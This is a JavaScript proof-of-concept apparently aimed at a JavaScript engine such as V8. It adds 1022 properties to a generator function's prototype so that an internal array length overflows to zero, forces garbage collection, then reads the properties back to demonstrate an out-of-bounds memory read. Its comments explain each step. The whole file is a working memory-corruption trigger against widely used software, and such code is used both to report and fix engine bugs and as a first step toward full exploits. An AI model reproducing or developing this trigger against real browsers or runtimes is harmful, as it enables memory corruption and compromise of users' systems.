readline();

function gc() {
    for (let i = 0; i < 20; i++)
        new ArrayBuffer(0x1000000);
}

function trigger() {
    function* generator() {
    }

    for (let i = 0; i < 1022; i++) {
        generator.prototype['b' + i];
        generator.prototype['b' + i] = 0x1234;
        //generator.prototype array length overflow to zero.
    }
    // print(generator.prototype.b800);
    // readline();
    // %DebugPrint(generator.prototype);
    // readline();

    gc(); // **trigger GC to reallocate generator.prototype array**.
    //now prototype old memory's have been gced, things onside is unknown.
    //OOB read can then e verified: 

    // for (let i = 0; i < 1022; i++) {
    //     generator.prototype['b' + i] = 0x1234;
    // }

    for (let i = 0 ; i < 1022; i++){
        try{
            // generator.prototype[0] = "aaaa";
            print(i + "==> " + generator.prototype['b'+ i] ); //OOB read test.
        }catch (e) { }
    }
    // for (let i = 0; i < 1022; i++) {
    //     generator.prototype['b' + i] = 0x1234;
    // }
}

trigger();
